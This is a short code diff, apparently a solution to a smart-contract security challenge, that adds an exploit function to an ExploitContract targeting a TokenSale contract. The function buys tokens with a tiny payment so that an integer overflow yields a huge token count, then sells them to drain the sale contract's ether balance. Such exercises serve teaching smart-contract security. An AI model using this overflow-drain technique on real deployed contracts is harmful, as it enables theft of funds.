@@ -40,7 +40,16 @@ contract ExploitContract {
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
+    receive() external payable {
 
-    receive() external payable {}
+    }
     // write your exploit functions below
+     function exploit(uint buyerAmount,uint msgValue) public {
+        tokenSale.buy{value:msgValue}(buyerAmount); // This call make the total(msg.value) very small , here less than 1 eth; and numTokens very huge
+        // calculate withdraw the max possible tokenSale's eth, need to sell how many TokenSale?
+        // total number  = 1 eth * numTokens
+        uint sellAamountToken = address(tokenSale).balance / (1 ether);
+        tokenSale.sell(sellAamountToken);
+
+    }
 }
